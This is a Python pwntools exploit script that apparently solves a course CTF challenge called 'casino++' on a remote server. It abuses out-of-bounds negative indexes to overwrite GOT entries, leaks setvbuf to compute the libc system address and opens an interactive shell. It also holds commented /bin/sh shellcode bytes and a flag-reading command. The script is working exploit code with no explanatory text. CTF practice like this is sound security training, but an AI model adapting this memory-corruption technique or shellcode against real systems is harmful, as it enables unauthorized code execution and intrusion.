from pwn import *
context.log_level = 'debug'
#sh='\x48\x31\xc9\xb5\x0e\x80\xc5\x01\x88\xad\x2b\xff\xff\xff\xb1\x04\x80\xc1\x01\x88\x8d\x2c\xff\xff\xff\x48\x31\xc9\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b'
sh="\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00AAAAAAA\xf0\x1f\x60\x000000"
#execve : 0x0e4e30s
age="28"
#-43
#-42
#0
#0x7f03fabdd6d3 print
#0x7f03fabe0435 system
#0x7f03fabe111c
#r=process('./casino++' )
#gdb.attach(r)
r=remote('edu-ctf.csie.org',10176)
r.sendlineafter("e:",sh)
r.sendlineafter("Your age: ",age)

r.sendlineafter("Chose the number 0: ",'0')
r.sendlineafter("Chose the number 1: ",'0')
r.sendlineafter("Chose the number 2: ",'0')
r.sendlineafter("Chose the number 3: ",'0')
r.sendlineafter("Chose the number 4: ",'0')
r.sendlineafter("Chose the number 5: ",'0')
r.sendlineafter("Change the number? [1:yes 0:no]: ",'1')
r.sendlineafter("Which number [1 ~ 6]: ",'-43')
r.sendlineafter("Chose the number -44: ",'4196701')
r.sendlineafter("Chose the number 0: ",'61')
r.sendlineafter("Chose the number 1: ",'68')
r.sendlineafter("Chose the number 2: ",'32')
r.sendlineafter("Chose the number 3: ",'22')
r.sendlineafter("Chose the number 4: ",'69')
r.sendlineafter("Chose the number 5: ",'20')
r.sendlineafter("Change the number? [1:yes 0:no]: ",'1')
r.sendlineafter("Which number [1 ~ 6]: ",'-42')
r.sendlineafter("Chose the number -43: ",'0')

r.sendlineafter('Chose the number 0: ','0')
r.sendlineafter('Chose the number 1: ','0')
r.sendlineafter('Chose the number 2: ','0')
r.sendlineafter('Chose the number 3: ','0')
r.sendlineafter('Chose the number 4: ','0')
r.sendlineafter('Chose the number 5: ','0')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','14')
r.sendlineafter('Chose the number 13: ','0')
r.sendlineafter('Chose the number 0: ','61')
r.sendlineafter('Chose the number 1: ','68')
r.sendlineafter('Chose the number 2: ','32')
r.sendlineafter('Chose the number 3: ','22')
r.sendlineafter('Chose the number 4: ','69')
r.sendlineafter('Chose the number 5: ','20')
r.sendlineafter('Change the number? [1:yes 0:no]: ','0')


r.sendlineafter('Chose the number 0: ','0')
r.sendlineafter('Chose the number 1: ','0')
r.sendlineafter('Chose the number 2: ','0')
r.sendlineafter('Chose the number 3: ','0')
r.sendlineafter('Chose the number 4: ','0')
r.sendlineafter('Chose the number 5: ','0')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','-35')
r.sendlineafter('Chose the number -36: ','4196102')
r.sendlineafter('Chose the number 0: ','61')
r.sendlineafter('Chose the number 1: ','68')
r.sendlineafter('Chose the number 2: ','32')
r.sendlineafter('Chose the number 3: ','22')
r.sendlineafter('Chose the number 4: ','69')
r.sendlineafter('Chose the number 5: ','20')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','-34')
r.sendlineafter('Chose the number -35: ','0')

r.sendlineafter('Chose the number 0: ','0')
r.sendlineafter('Chose the number 1: ','0')
r.sendlineafter('Chose the number 2: ','0')
r.sendlineafter('Chose the number 3: ','0')
r.sendlineafter('Chose the number 4: ','0')
r.sendlineafter('Chose the number 5: ','0')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','-43')
r.sendlineafter('Chose the number -44: ','4196701')
r.sendlineafter('Chose the number 0: ','22')
r.sendlineafter('Chose the number 1: ','67')
r.sendlineafter('Chose the number 2: ','58')
r.sendlineafter('Chose the number 3: ','53')
r.sendlineafter('Chose the number 4: ','74')
r.sendlineafter('Chose the number 5: ','3')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','-42')
r.sendlineafter('Chose the number -43: ','0')
setvbuf_addr=u64(r.recvuntil('\x0a',drop=True)[0:].ljust(8,'\x00'))
system_addr=setvbuf_addr-0x21ab0+0x4f440
system_addr1=system_addr//0x100000000
system_addr2=system_addr%0x100000000
system_addr_dec1=str(int(hex(system_addr1),16))

system_addr_dec2=str(int(hex(system_addr2),16))
print(str(hex(system_addr)))
r.sendlineafter('Chose the number 0: ','61')
r.sendlineafter('Chose the number 1: ','0')
r.sendlineafter('Chose the number 2: ','4')
r.sendlineafter('Chose the number 3: ','22')
r.sendlineafter('Chose the number 4: ','69')
r.sendlineafter('Chose the number 5: ','20')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','13')
r.sendlineafter('Chose the number 12: ','6299888')
r.sendlineafter('Chose the number 0: ','97')
r.sendlineafter('Chose the number 1: ','97')
r.sendlineafter('Chose the number 2: ','82')
r.sendlineafter('Chose the number 3: ','29')
r.sendlineafter('Chose the number 4: ','81')
r.sendlineafter('Chose the number 5: ','31')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','14')
r.sendlineafter('Chose the number 13: ','0')

r.sendlineafter('Chose the number 0: ','7')
r.sendlineafter('Chose the number 1: ','68')
r.sendlineafter('Chose the number 2: ','46')
r.sendlineafter('Chose the number 3: ','13')
r.sendlineafter('Chose the number 4: ','73')
r.sendlineafter('Chose the number 5: ','73')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','-35')
r.sendlineafter('Chose the number -36: ',system_addr_dec2)


r.sendlineafter('Chose the number 0: ','65')
r.sendlineafter('Chose the number 1: ','19')
r.sendlineafter('Chose the number 2: ','48')
r.sendlineafter('Chose the number 3: ','68')
r.sendlineafter('Chose the number 4: ','95')
r.sendlineafter('Chose the number 5: ','18')
r.sendlineafter('Change the number? [1:yes 0:no]: ','1')
r.sendlineafter('Which number [1 ~ 6]: ','-34')
r.sendlineafter('Chose the number -35: ',system_addr_dec1)


#-35 4196102
#-34 0
#13 0
# 4196705
# printf
r.interactive()
#cat /home/shellc0de/flag
